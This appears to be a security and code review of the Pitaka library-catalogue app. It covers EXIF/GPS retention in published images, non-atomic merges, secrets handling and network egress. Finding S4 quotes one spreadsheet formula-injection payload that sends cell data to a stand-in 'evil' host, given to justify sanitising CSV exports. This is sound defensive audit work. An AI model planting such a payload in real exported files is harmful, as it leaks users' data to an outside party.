# Comprehensive Review — Pitaka (round 2, 2026-08-03)

Baseline: HEAD `118bf31` (1.1.7). Prior review `REVIEW_FINDINGS.md`; its 13
Majors were remediated in `bb50eb2` — every one was re-verified against the
current tree before this review (see §Regressions). Gates at review time:
`flutter analyze` 0 issues, 651 Dart tests pass.

## 1. Executive summary

Overall posture is strong: layering is now clean (architecture test enforces
it), the vault secret lifecycle is exemplary (useAsync-scoped FFI copies,
two-file staged vault restore with rollback), publish output is escaped +
CSP'd + allow-listed, and hostile-input parsing is bounded. No telemetry, no
egress outside the three documented paths.

Top 3 risks found this round:

1. **[Blocker] EXIF/GPS is NOT stripped from images despite four in-code
   claims that it is** — published poster/cover JPEGs can carry the
   photographer's GPS coordinates onto the public site. Verified empirically
   against the locked `image 4.3.0`.
2. **[Major] Merge is not atomic and trips over its own UNIQUE indexes** —
   a file with two same-ISBN rows (or an insert failure mid-union) leaves a
   partial add reported as total failure; OVERWRITE can delete the catalogue
   and fail before re-inserting.
3. **[Major] Cross-device merge generates spurious conflicts for every book
   with a local cover** — `mergeEquals` compares raw `coverUrl` while the
   importer nulls incoming local cover refs, so the two-maintainer ping-pong
   flow the feature exists for surfaces phantom conflicts.

## 2. Regressions of previously-flagged items

None found. All 13 prior Majors verified fixed in the current tree:

- Settings domain purity: `app_settings.dart` now has a domain `AppThemeMode`
  enum; `test/architecture/domain_purity_test.dart` gates both domain purity
  and app/presentation→infrastructure imports.
- App/presentation→infra imports: zero matches repo-wide (grep verified).
- `library_controller.dart:39` sort is now `ref.watch(...select(...))`;
  `remove()`/`restoreRemoved()` (:85-105) and `wishlist_controller.delete`
  (:47-52) fold `Either` into `AsyncError` (fail closed).
- Device-flow dialog: `publish_page.dart:140` fires the user-code dialog
  `unawaited` and dismisses on terminal states — polling no longer suspends.
- Raw HTTP text to UI: `github_error_messages.dart` provides fixed messages;
  `publish_library_use_case.dart:301-304` drops response bodies; every
  `publish_page.dart` error branch uses a fixed string (checked :139-175,
  :286-296, :375, :400, :416 — `PublishFailure.reason` is only ever built
  from fixed messages in the use case).
- Cover-capture and logo pipelines moved to `BookCoverController` /
  `LibraryLogoController` (+ tests exist for both).
- FFI passphrase copies: `ffi_vault_repository.dart` uses
  `passphrase.useAsync(...)` on all 13 FFI call sites; biometric `wrap.secret`
  is wiped after copy (:296-297).
- Restore atomicity: `vault_store.dart:95-215` staged two-file commit with
  blob rollback, staged in Phase 5.5 *before* the library transaction
  (`restore_backup.dart:182-240`).
- Publish `_verifyLive`, timeout client (`timeout_http_client.dart`) wired as
  the shared `httpClient` — lookup services now inherit a 60 s bound.

## 3. Findings by surface

### S1. Rust FFI trust boundary — no new findings

`rust/` is byte-identical since the prior review (`git diff bb50eb2..HEAD --
rust/` is empty). The prior assessment stands: Argon2id m=64 MiB/t=3/p=1,
AES-256-GCM with fresh OsRng salt+IV, `Zeroizing<>` key material, passphrase
`zeroize()` on every return path, parameterised SQL, typed error enums, no
panics on hostile paths, strong hostile-input test coverage (22 Rust tests).
Carried-over Minors (FRB marshalling copies, `db_path` accepted verbatim,
empty AAD) remain open and documented; none is actionable without a format
bump or FRB support.

### S2. Secrets & key material

- **[Minor — carried]** `lib/features/vault/application/vault_session_controller.dart`
  — the unlocked session (`keepAlive`, holds `_passphrase`) still survives
  app backgrounding indefinitely. `app_gate.dart:68-85` re-gates the UI, but
  the secret stays in memory and the vault stays unlocked behind the gate.
  Deliberate UX trade-off, still undocumented in code. Direction: an explicit
  doc comment or an optional auto-lock timeout.
- **[Minor — carried]** FLAG_SECURE keys off `VaultUnlocked` only
  (`screen_security.dart:22`, `main.dart:39-50`). Passphrase entry on the
  vault *create* flow (`vault_page.dart:171`) and the unlock page run before
  any unlock succeeds, so those screens are capturable. The fields render
  masked bullets only, so exposure is low — but a per-screen secure toggle on
  passphrase-bearing pages would close it.
- **[Minor — carried]** `secure_storage_biometric_keystore.dart:53,69` —
  base64 `String` transit of S remains (plugin API is String-only; documented
  as the unavoidable boundary cost). `github_device_flow.dart` token-as-String
  likewise. Both are documented accepted exceptions; no change since round 1.
- **[OK]** `SecretBytes`, `SecurePassphraseField`, session controller
  ownership discipline, no `print`/log of secrets anywhere in `lib/`
  (re-grepped: zero hits).

### S3. Local persistence

- **[Minor]** `lib/core/database/app_database.dart` — `schemaVersion` still 1,
  `onCreate` only; fine today, but there is no migration test scaffold. When
  the first schema bump lands, forward-migration tests must land with it
  (noted in test gaps).
- **[Minor]** Backup completeness: `.pitabak` archives contain books,
  wishlist, vault, covers only (`backup_archive_writer.dart:108-125`). Event
  posters, `events.json`, bookmarks, the library logo, settings (library
  ID/name, contact fields) and the publish manifest/salt are all NOT backed
  up. Likely deliberate (Kotlin-app bidirectional format), but a user
  restoring on a new phone silently loses their events page, logo, library
  identity and publish continuity — and nothing tells them. Direction:
  document the exclusion in the backup UI, or add a Flutter-only sidecar
  entry that the Kotlin reader ignores.
- **[OK]** Nothing secret-shaped in `shared_preferences`
  (`prefs_settings_repository.dart` holds theme/name/ID/sort/contact —
  all non-secret by design; library ID is a namespace token, not a secret).
  FTS input quoted (`drift_book_repository.dart:264-272`). UNIQUE indexes on
  isbn/book_uid present with a regression test.

### S4. File import parsing (hostile input)

- **[Major]** CSV **export** formula injection —
  `lib/features/import_export/application/export_library_use_case.dart:223-228`
  (`_csv`) quotes commas/quotes/newlines but does not neutralise
  formula-leading cells (`=`, `+`, `-`, `@`, tab/CR variants). Book titles and
  notes are attacker-influenceable (a merge or import can plant
  `=HYPERLINK("http://evil/?"&A1)` as a title); the exported CSV is exactly
  the artifact a librarian opens in Excel/LibreOffice, which will execute it.
  Classic OWASP CSV-injection. Direction: prefix a `'` (or space) to any
  field starting with `= + - @ \t \r`, the same mitigation OWASP and
  Google Sheets exporters use. (Import side is unaffected — no formula
  evaluation in the app.)
- **[Minor]** `merge_page.dart:60` (`file.readAsString()`) and
  `import_page.dart:55` (`readAsBytes()`) materialise the entire user-picked
  file into memory *before* `ImportLimits.maxTextChars` (64 MiB) is checked
  in the parser. A multi-GB pick OOMs the app before the cap applies.
  User-picked (not remote) so DoS-on-self, but the cheap fix is a
  `file.length()` check before reading.
- **[OK]** `bounded_zip_extractor.dart` — caps verified against actual
  decompressed length; the `archive 3.6.1` internals were checked:
  `entry.size` comes from the central directory and is checked *before*
  `entry.content` triggers `Inflate.buffer` — but note the inflater
  pre-allocates `uncompressedSize` from the (attacker-controlled) local
  header. A lying header can make it allocate up to 4 GiB *transiently*
  regardless of your caps. **[Minor]** — the per-entry cap early-reject uses
  the central-directory size, while the allocation uses the local-header
  size; a mismatch between the two bypasses the early reject (the post-hoc
  length check still fires, but after allocation). Direction: when porting to
  archive 4.x (PLAN.md tier 2), pick the streaming API so allocation is
  bounded by bytes actually inflated.
- **[OK]** JSON importer: size cap before `jsonDecode`, schema-too-new
  refusal, per-field clamping, per-collection row caps, never throws.
  Goodreads CSV importer shares the same `ImportLimits`. Malformed legacy
  SQLite → `BackupCorruptFailure` via `_withDb` (`restore_backup.dart:309`),
  reader coerces tolerantly. `CoverPaths.leafOf` re-validates cover leaves on
  restore (`restore_backup.dart:344`).

### S5. Merge & multi-maintainer sync

- **[Major]** Spurious conflicts on every cross-device merge of books with
  local covers — `library_merge_engine.dart:280` (`mergeEquals` compares
  `a.coverUrl == b.coverUrl`) versus `pitaka_json_exporter.dart:58` (exports
  the local `covers/<uuid>.jpg` ref as-is) versus
  `pitaka_json_importer.dart:139-143` (merge parses with
  `keepLocalCovers=false`, so incoming local refs become null). Consequence:
  device A's book (cover `covers/abc.jpg`) vs the same book arriving from
  device B (cover null) → `mergeEquals` false → surfaced as a conflict even
  when every real field matches. Every book with a camera-captured cover
  conflicts on every exchange — the exact two-maintainer flow the engine was
  built for. The engine-level "same export re-merged is a no-op" test passes
  only because it never round-trips through export/import. Direction:
  normalise cover refs out of `mergeEquals` (compare only remote URLs, or
  ignore `CoverPaths.isLocal` refs on both sides), and add a
  round-trip test (export → parse → planMerge = no-op).
- **[Major]** Duplicate ISBNs *within* one incoming file break the merge
  non-atomically — `library_merge_engine.dart:196-200`: an incoming book
  with an ISBN and no *local* match goes straight to `toAdd`; the index is
  built from local books only, so two incoming rows sharing an ISBN both
  land in `toAdd`. `merge_library_use_case.dart:308-318` then inserts
  sequentially with no transaction; the second insert hits the UNIQUE isbn
  index (`app_database.dart:38`), returns `StorageFailure`, and the use case
  reports total failure (`added: 0`) after the first N books were actually
  committed. Re-running skips the committed ones (they now match), so it
  converges, but the reported state is wrong and the DB was mutated by a
  "failed" operation. Direction: de-duplicate incoming rows by normalised
  ISBN in `planMerge` (surface dupes like possible-duplicates), and wrap
  `_applyEngineMerge`'s insert loop in one Drift transaction.
- **[Major]** `applyOverwrite` (`merge_library_use_case.dart:202-230`) is
  destructive and non-transactional: it hard-deletes every local book, then
  inserts incoming ones; a failure after the deletes (or mid-insert — e.g.
  the duplicate-ISBN case above) leaves the device with a partial or empty
  catalogue. Recoverable by re-running from the same file, and confirm-gated
  in the UI (`merge_page.dart:105-129`), so Major not Blocker — but this is
  the one path where a crafted file plus one IO error costs real data.
  Direction: single transaction (delete + insert together), or insert into a
  staging state first.
- **[OK]** Identity order (uid → ISBN → fuzzy), first-claim-wins fan-in
  guard, add-only semantics, removal-as-conflict, `keepBoth` clearing
  uid+ISBN (verified `_freshCopyOf` drops both), library-ID gate treating
  malformed IDs as absent, JOIN adoption via `LibraryId.normalizeOrNull`.
  Engine idempotency at engine level is tested; `tokenSet` handles Indic
  combining marks (`\p{M}` — verified with the Devanagari-aware test).

### S6. Network egress

- **[Minor]** `bounded_cover_fetcher.dart:81` — `http.Request` defaults to
  `followRedirects = true` (verified in `http` package source), so the
  origin allow-list is enforced only on the *first* URL. If an allow-listed
  host (covers.openlibrary.org legitimately 302s to archive.org CDNs)
  redirects, the fetch follows to a host outside the allow-list — the byte
  cap and timeout still apply, but the "no packet to a non-allow-listed
  host" comment is not literally true. Attacker leverage is low (they'd have
  to control an allow-listed host), and disabling redirects would break Open
  Library covers — so this is a documentation/decision issue: either set
  `followRedirects = false` and accept broken OL covers, or document the
  redirect exposure at the fetcher. Also note the app-level 60 s
  TimeoutHttpClient wraps the fetcher's own 15 s deadline — fine.
- **[OK]** Lookup egress carries only the ISBN/typed title to two hard-coded
  https hosts; timeouts now inherited from the shared client. Google Books
  `imageLinks.thumbnail` (historically `http://`) is defused: `CoverPaths.
  remoteUrlOf` rejects non-https for in-app display, and
  `CoverUrlAllowList.sanitize` rejects non-https for publish — the prior
  "needs verification" item is now **verified closed**.
- **[OK]** GitHub: token header-only, hosts hard-coded https, scope
  `public_repo` (least privilege), device-flow verification URI validated
  (`safeGithubVerificationUri`), fixed error messages end-to-end, secure
  storage hardened options, sign-out clears token. `setup_github_repo.dart`
  validates repo names against `^[A-Za-z0-9._-]{1,100}$` and maps all API
  exceptions to `NetworkFailure`.

### S7. Generated HTML/web output

- **[Minor]** `viewer_html_builder.dart:39` — `{{LOGO_DATA_URL}}` is
  substituted **unescaped** into `<img src="...">` (index.html:226). Today
  the only call site (`providers.dart:318`) never passes a logo, so the
  value is always `''` and this is latent — but the parameter is a ready-made
  attribute-injection sink for whoever wires the user logo feature to it
  next. Direction: escape it like the other placeholders, or constrain it to
  a validated `data:image/...;base64,` shape.
- **[OK]** All catalogue fields pass through `escape()` in the viewer JS
  (index.html:320-470 — titles, authors, ISBNs, transliterations, option
  values, cover URLs in attributes); badges/labels are fixed strings; CSP
  meta locks `img-src` to the same allow-list as `CoverUrlAllowList` with a
  lockstep test (`viewer_csp_lockstep_test.dart`); `publish_redaction.dart`
  strips notes/location/source/addedBy; availability is coarse and omitted
  when the vault is locked; salted 64-bit cover ids hide internal ids, salt
  in secure storage, `Random.secure()`. Events page: descriptions escaped,
  posters same-origin, CSP `img-src 'self' data:`.
- **BUT** see the S11 Blocker: the *pixels* published are fine; the JPEG
  *metadata* is not.

### S8. Camera, QR & pairing inputs

- **[Minor]** `settings_page.dart:239-249` — a scanned library-QR is adopted
  with **no confirmation step**: one valid scan → `setLibraryId(id)`
  immediately. The payload is well-validated (prefix + 16–64 lowercase hex,
  `library_qr_payload.dart`), so injection is out — but at a pairing party a
  malicious QR silently rebinds the device to the attacker's library ID,
  which then makes the attacker's export files pass the JOIN gate as
  "matching library" (auto-applied add-only merge — no destructive path, but
  catalogue pollution without the differ-decision speed bump). Direction:
  show a confirm sheet ("Join library `ab12…`? Exports will match this
  maintainer.") before adopting.
- **[OK]** Scanner accepts only checksum-valid ISBNs
  (`scanner_page.dart:26-34` → `IsbnFormat.isValid` with real check-digit
  math); scan never auto-saves; QR pairing page ignores non-matching codes
  and pops on first valid one (`scan_library_qr_page.dart:29-38`);
  `flutter_zxing` keeps the F-Droid constraint (no MLKit anywhere in
  pubspec).

### S9. Platform channels & OS integration

- **[OK]** `screen_security.dart` — single narrow method channel, fail-safe
  no-op off Android; Kotlin side (`MainActivity.kt:30-36`) only toggles
  FLAG_SECURE. Manifest permissions are exactly CAMERA, INTERNET,
  USE_BIOMETRIC — all used, none extra. `file_share.dart` wraps share_plus
  behind a seam; exports contain only catalogue data (vault ships as
  ciphertext in `.pitabak`). `url_launcher` targets are allow-listed
  (`library_bookmark.dart` — https + Pages-host suffix match, userinfo
  rejected) or derived from validated contact parts
  (`borrower_contact.dart` — tel/wa.me built from digit-filtered input,
  mailto only for regex-validated addresses).
- **[Nit]** `borrower_profile_page.dart:206` `_launch` takes a pre-built URI
  string; all current call sites are safe constructors from
  `BorrowerContact`, but the helper itself would happily launch anything.
  Keeping construction and launch in one place (pass the typed part, build
  the URI inside) would make misuse impossible.

### S10. Backup/restore

- **[Minor — sharpened from round 1]** `restore_backup.dart:203-223` —
  `rebuildFts()` runs *inside* the same `try` as the transaction but *after*
  it commits; if the rebuild throws, the handler aborts the staged vault and
  reports failure — yet the library replacement already committed. Result:
  new library + old vault + "restore failed" message. Round 1 flagged the
  misleading message; the staged-vault abort now makes the cross-store
  inconsistency *worse* on this path. Direction: move `rebuildFts()` after
  Phase 6.5 (it is repairable/best-effort), or run it inside the
  transaction.
- **[Minor — carried]** Cover routing remains silent best-effort
  (`_restoreCovers`, :330-349) with no skipped-count in `RestoreSummary`;
  whole-archive-in-RAM (up to 500 MiB decompressed + original bytes)
  remains; live `borrowers.db` copied verbatim into backups relies on
  SQLCipher default journal mode (no `-wal` sibling) — still worth a pinning
  assertion.
- **[OK]** Phase ordering (all fallible work before first write), staged
  two-file vault commit with rollback, schema-too-new refusal,
  wrong-passphrase vs corrupt distinction, scratch dirs wiped in `finally`,
  restore idempotent.

### S11. Media pipeline

- **[Blocker — VERIFIED]** EXIF (including GPS) is **not stripped**,
  contradicting four explicit claims in the code
  (`file_events_repository.dart:8,80`, `events_repository.dart:24`,
  `providers.dart:552`, `events_controller.dart:27`).
  `image_downscaler.dart` decodes → `copyResize` → `encodeJpg`; in
  `image 4.3.0` (the locked version) `copyResize` clones EXIF into the
  resized image (`Image.fromResized` → `_exif = other._exif?.clone()`,
  copy_resize.dart:91 / image.dart:116) and `encodeJpg` writes it back out
  (`_writeAPP1`, jpeg_encoder.dart:59). **Empirically confirmed** in an
  isolated probe against image 4.3.0: a GPS IFD survives
  decode→copyResize→encodeJpg, and also the small-image no-resize path.
  Upstream, `image_picker`'s Android re-encode copies GPS tags too
  (ExifDataCopier.java:100+ includes all TAG_GPS_*). Impact chain: a
  gallery photo with location tagging → poster → `posters/<uuid>.jpg` →
  **published to the public events page with the photographer's home
  coordinates embedded**; same for camera-captured covers via
  `BookCoverController` → publish `_readLocalCover` (both re-encodes
  preserve EXIF). This directly violates the app's privacy contract (§2a)
  and the data-safety story. Direction: in `downscaleJpeg`, clear metadata
  before encoding (`decoded.exif = ExifData();` — one line) and add a
  regression test that encodes an image with a GPS IFD and asserts the
  output has none. Fix belongs in `ImageDownscaler` so covers, posters and
  logos are all cleaned at the single choke point.
- **[Minor]** Decoder-bomb posture: `img.decodeImage` allocates
  width×height×4 before any bound is applied — a crafted 20k×20k JPEG
  (~1.6 GiB) OOMs the isolate. Input is user-picked (and camera/picker
  pre-bound with maxWidth), so self-DoS only; a cheap guard is decoding the
  header first (`findDecoderForData` + `startDecode`) and rejecting absurd
  dimensions before full decode. Note also decode runs on the UI isolate —
  a large legit photo will jank; `Isolate.run` would fix both.
- **[OK]** Sizes/quality bounded (400×600/1080×1440 q80), temp cleanup on
  the picker paths is the plugin's cache (system-managed), stored covers
  UUID-named.

### S12. PDF export — no significant findings

`pdf_library_renderer.dart` paginates row-by-row (no unbounded growth
beyond the book list itself, which is bounded by import caps); Indic text is
shaped via the raster seam (HANDOFF §8 — shaped-image tiles, host-tested);
private columns (location/source) are default-off (`pdf_column.dart:21,59`)
and the column set is an explicit allow-list. **[Nit]** A very large library
produces a very large in-memory PDF (`bytes` built fully in RAM) — same
accepted-bounded posture as the backup writer.

## 4. Architecture & quality pass

- **[OK]** Layering: domain purity + no-infra-imports enforced by
  `test/architecture/domain_purity_test.dart` (both rules verified present);
  spot-grep of the tree found zero violations.
- **[Minor — carried]** `providers.dart:330` still constructs
  `SecureStorageCoverSaltStore()` inline (not via a provider);
  `providers.dart:177` still `ref.read`s the session notifier inside a
  provider build (safe only because it's keepAlive); `borrowerProfile` /
  `pendingSnapshot` (:411,:427) still freeze `DateTime.now()` — overdue
  badges only update on vault mutations. All three were Minors in round 1;
  unchanged.
- **[Minor — carried]** `settings_controller.dart:24-30` `_update` awaits
  `persist()` un-guarded: a prefs write failure throws out of an un-awaited
  setter — no `AsyncError`, no message. Unchanged from round 1.
- **[Nit]** `publish_controller.dart:27,33` `_phase` is written during a run
  but nothing reads it (the page no longer polls it) — dead weight; fold it
  into state or delete it.
- **[Nit]** `events_controller.dart` / `bookmarks_controller.dart` still
  collapse failures to `bool` (round-1 note; deliberate, low-stakes).
- **[OK]** Riverpod: codegen-only, keepAlive justifications present,
  disposal correct. Errors: `Either` discipline holds on every path
  re-checked this round. F-Droid: dependency scan clean (no Play Services /
  Firebase / MLKit anywhere in pubspec.lock).

## 5. Privacy / threat table

| Surface | Data exposed | To whom | Current protection | Gap |
|---|---|---|---|---|
| S1 vault | borrowers, loans | disk / FFI | Argon2id + AES-GCM, zeroization both sides | none new |
| S2 secrets | passphrase, S, token | RAM / OS store | SecretBytes, useAsync, hardened secure storage | background session lifetime (Minor) |
| S3 DB/prefs | catalogue, settings | app sandbox | app-private storage, plaintext-by-design | backup excludes events/logo/ID (Minor) |
| S4 import | attacker file | app | bounded zip/JSON/CSV parsing | CSV **export** formula injection (Major); pre-read OOM (Minor) |
| S5 merge | incoming catalogue | local DB | ID gate, add-only, conflicts surfaced | non-atomic apply, dup-ISBN failure, cover-conflict noise (3× Major) |
| S6 network | ISBN/title, publish payload, token | OL/GB/GitHub | https, allow-lists, timeouts, fixed errors | redirect follows off-allow-list (Minor) |
| S7 published site | redacted catalogue, posters | the world | escaping, CSP, redaction, salted ids | **GPS EXIF in published JPEGs (Blocker)**; logo placeholder unescaped (latent Minor) |
| S8 QR/camera | library ID adoption | device | shape validation | no adopt confirmation (Minor) |
| S9 platform | share/export files, intents | OS/other apps | narrow channels, allow-listed launches | none new |
| S10 backup | full catalogue + vault ciphertext | user-chosen share target | staged commit, bounded extract | rebuildFts ordering (Minor) |
| S11 media | photos → covers/posters | disk + published site | downscale bounds | **EXIF not stripped (Blocker)** |
| S12 PDF | selected columns | user-chosen share target | private columns default-off | none |

## 6. Test-gap list (highest risk first)

1. **EXIF stripping regression test** — encode a fixture with a GPS IFD
   through `ImageDownscaler.downscaleJpeg` (both resize and no-resize
   paths) and assert the output JPEG has no APP1/GPS data. Would have
   caught the Blocker.
2. **Merge round-trip test** — export → `PitakaJsonImporter.parse` →
   `planMerge` against the originating library must be a no-op (catches the
   coverUrl conflict Major).
3. **Duplicate-ISBN-in-file merge test** — two incoming rows sharing a new
   ISBN: assert either both surfaced or one added, and that the DB state
   matches the reported `MergeResult` (catches the atomicity Major).
4. **applyOverwrite failure-injection test** — repo whose Nth insert fails;
   assert the catalogue is not left partially deleted (transaction).
5. **CSV export injection test** — book titled `=1+1` must not export as a
   bare formula cell.
6. **BoundedCoverFetcher redirect test** — MockClient 302 from an
   allow-listed host to a non-allow-listed one; pin whichever behavior you
   decide.
7. **rebuildFts-throws restore test** — assert the reported result matches
   the actual device state (library replaced or not, vault installed or
   not).
8. Schema-migration test scaffold before the first `schemaVersion` bump
   (PLAN.md tier 1 drift bump makes this imminent).

## 7. Verified vs. unverified

**Verified by execution:** EXIF retention through image 4.3.0
decode/resize/encode (isolated Dart probe, exact locked version); full test
suite (651 pass); analyzer clean.

**Verified by reading (high confidence):** every finding above with
`path:line` cites — including the merge coverUrl/dup-ISBN traces (engine +
use case + exporter + importer + Drift UNIQUE index all read end-to-end),
`http.Request.followRedirects` default (package source read), archive 3.6.1
inflater pre-allocation (package source read), image_picker Android GPS-tag
copying (plugin source read).

**Unverified / would confirm:**
- That a real Android camera/gallery photo's GPS actually survives the
  *picker* step on-device for current plugin versions (source says yes;
  confirm with one photo + `exiftool` on the published JPEG). The
  `ImageDownscaler` half of the chain is confirmed regardless.
- Whether covers.openlibrary.org currently 302-redirects cover GETs (affects
  the practical impact of the S6 redirect Minor).
- SQLCipher journal mode on-device (backup verbatim-copy assumption).
- The OOM thresholds for S4/S11 on a low-RAM device (bounded-by-design
  claims read true; not exercised).
